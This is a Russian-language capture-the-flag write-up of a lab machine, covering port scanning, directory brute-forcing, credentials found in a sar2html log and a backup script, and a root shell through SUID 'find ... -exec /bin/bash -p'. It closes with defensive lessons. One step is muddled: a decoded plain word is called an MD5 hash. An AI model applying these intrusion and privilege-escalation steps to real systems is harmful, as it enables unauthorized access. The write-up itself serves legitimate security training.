## Кратко

Машина с открытыми FTP, HTTP, веб-панелью MiniServ и SSH на нестандартном порту. Декодирование ASCII-подсказки в `robots.txt` особого результата не дает, зато перебор директорий находит уязвимое приложение sar2html с файлом учетных данных. Через SSH получаем первого пользователя, далее по оставленному в скрипте паролю переключаемся на второго, а итоговый root получаем через SUID-бит на `find`.

## 1. Разведка

### Сканирование портов

```bash
nmap -sC -sV -p- <IP-адрес>
```

| Порт | Протокол | Сервис | Примечание |
|------|----------|--------|------------|
| 21 | TCP | FTP | Открыт |
| 80 | TCP | HTTP | Веб-сервер |
| 10000 | TCP | MiniServ | Веб-интерфейс управления |
| 55007 | TCP | SSH | SSH на нестандартном порту |

### Исследование веб-сервисов

На главной странице веб-сайта (порт 80) ничего полезного не найдено.

Подключение к FTP под анонимным пользователем:

```bash
ftp <IP-адрес>
# логин: anonymous
# пароль: (пусто)
```

В FTP-директории также не нашлось интересных файлов.

В `robots.txt` обнаружены десятичные ASCII-коды:

```
107 105 100 100 105 110 103
```

Декодирование (107=k, 105=i, 100=d, 100=d, 105=i, 110=n, 103=g) дает слово `kidding`, которое оказалось MD5-хешем. Расшифрован на **crackstation.net**.

MiniServ (порт 10000) проверен на эксплуатацию — непригоден, дальнейшее исследование этого сервиса прекращено.

### Перебор директорий

```bash
gobuster dir -u http://<IP-адрес> -w /usr/share/wordlists/dirbuster/big.txt
```

Найденные директории:
- `/joomla` — CMS Joomla
- `/joomla/_test` — тестовая директория
- другие директории, в том числе шуточные от автора машины (без полезной информации)

Внутри `/joomla/_test` обнаружен файл, указывающий на приложение **sar2html** с функцией загрузки файлов. Попытки загрузить reverse shell с разными расширениями результата не дали — система отклоняла загрузки.

Продолжая перебор поддиректорий sar2html, находим файл `log.txt` с учетными данными:

```
username: basterd
password: supersuperp@$$
```

## 2. Получение доступа

Подключаемся по SSH на нестандартный порт:

```bash
ssh basterd@<IP-адрес> -p 55007
# Пароль: supersuperp@$$
```

## 3. Повышение привилегий (basterd → stoner)

В домашней директории пользователя `basterd` находится скрипт `backup.sh`:

```bash
cat backup.sh
```

Внутри — учетные данные другого пользователя:

```
username: stoner
password: [пароль]
```

Переключаемся на найденного пользователя:

```bash
su stoner
```

Поиск `user.txt` стандартными средствами результата не дал. Выводим скрытые файлы:

```bash
ls -la
```

В домашней директории `stoner` обнаружен скрытый файл `.secret`, содержащий первый флаг.

**Флаг пользователя:** содержимое `.secret`

## 4. Повышение привилегий (stoner → root)

Ищем SUID-файлы:

```bash
find / -perm -4000 2>/dev/null
```

В выводе обнаружена утилита `find` с установленным SUID-битом.

По **GTFOBins**, `find` можно использовать для получения шелла:

```bash
find . -exec /bin/sh \; -quit
```

Эта команда открывала шелл без root-прав. Модифицируем команду, чтобы сохранить привилегии:

```bash
find . -exec /bin/bash -p \; -quit
```

Получен root-доступ. Читаем финальный флаг:

```bash
cd /root
cat root.txt
```

**Флаг root:** содержимое `root.txt`

## Выводы

- ASCII-подсказка в `robots.txt`, декодированная в MD5-хеш слова, не являлась ключевым вектором атаки, но демонстрирует, что стоит проверять подобные файлы на скрытые данные.
- Приложение sar2html с функцией загрузки файлов и незащищенным `log.txt` раскрыло рабочие учетные данные пользователя.
- Пароль, оставленный в скрипте `backup.sh`, позволил повысить привилегии до второго пользователя без дополнительных эксплойтов.
- SUID-бит на `find` без ограничений — классический вектор privesc до root через GTFOBins.
- Для защиты: не хранить пароли в скриптах и файлах логов, убрать лишние SUID-биты с системных утилит, ограничить доступ к файлам загрузки.

## Использованные инструменты

`nmap`, `ftp`, `gobuster`, crackstation.net, GTFOBins
